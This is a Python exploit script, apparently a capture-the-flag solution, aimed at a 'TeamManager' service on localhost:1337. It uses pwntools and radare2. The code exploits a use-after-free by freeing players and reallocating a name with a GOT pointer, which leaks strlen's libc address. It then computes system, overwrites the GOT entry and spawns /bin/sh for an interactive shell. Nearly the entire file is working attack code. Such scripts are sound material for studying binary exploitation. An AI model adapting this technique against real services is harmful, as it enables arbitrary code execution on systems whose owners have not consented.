#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import os
import sys
import multiprocessing
from time import sleep

import r2pipe


# encoding:utf8
from pwn import args, log, remote, p64, u64
from pwnlib.tubes import process
from pwnlib.util import packing
from pwnlib.elf.elf import ELF
import os
import sys

from client import TeamManagerClient

def radare(r2):
    print r2.cmd('aa')
    # print r2.cmd('db 0x00401793')
    print r2.cmd('db main')
    print r2.cmd('db sym.show_player_func')
    print r2.cmd('db sym.add_player')
    print r2.cmd('db sym.show_player')
    print r2.cmd('s sym.imp.strlen')
    # while True:
    #     try:
    #         sys.stdout.flush()
    #         print 'zzzzzzzzzzzzzzzzzzz' * 4
    #         if r2.cmdj('dij')['type'] == 'dead':
    #             print 'Dead'
    #             sys.stdout.flush()
    #             break
    #
    #         print r2.cmd('dc')
    #         print r2.cmd('pd 10')
    #         print r2.cmd('s')
    #         # print r2.cmd('afvd?')
    #         print r2.cmd('db')
    #         print 'zzzzzzzzzzzzzzzzzzz' * 4
    #         sys.stdout.flush()
    #     except Exception as e:
    #         print r2.cmd('dc')
    #         print e
    #         sys.stdout.flush()
    # while True:
    #     print r2.cmd('dc')
    #     print r2.cmd('s')
    # r2.quit()




if __name__ == '__main__':
    if 0:
        os.system('killall main_patched.elf')
        target = process.process(['gdb', '-q', 'main_patched.elf'])
        target.sendline('break *0x00401793')  # sym.show_player
        # target.sendline('break *0x00402117')  # sym.show_team
        # target.sendline('break *0x0040214b')
        target.sendline('commands')
        # target.sendline('x/20gx $rdi - 0xa0')
        target.sendline('i r rdi')
        target.sendline('x/20gx $rdi')
        target.sendline('continue')
        target.sendline('end')

        target.sendline('heap-analysis')
        target.sendline('run')


    client = TeamManagerClient('localhost', 1337)
    client.connect()

    client.add_player('A' * 15) # 0
    client.add_player('C' * 30) # 1
    client.select_player(0)
    client.remove_player(0)
    client.remove_player(1)
    client.add_player('AAAAAAAAAAAAAAAA' + p64(0x603040)) # 0x603040 got.strlen
    output = client.show_player()

    name_str = re.search(r'Name:\s+(.*)$', output, re.MULTILINE).group(1)
    leak = u64(name_str.ljust(8, '\x00'))
    log.info("got.free = 0x%x", leak)

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # libc = ELF('./libc.so.6')
    system_offset = libc.symbols['system']
    strlen_offset = libc.symbols['strlen']
    log.info("libc.system = 0x%x", system_offset)
    log.info("libc.strlen = 0x%x", strlen_offset)
    log.info("got.strlen = 0x%x", leak)

    got_system = leak - strlen_offset + system_offset
    log.info("got.system = 0x%x", got_system)

    client.edit_player(p64(got_system))
    client.add_player('/bin/sh')
    client.interactive()

    if 0:
        log.info('-------gdb----------')
        log.info(target.recvrepeat(0.2))
        log.info('--------------------')
        # target.interactive()
        os.system('killall main_patched.elf')
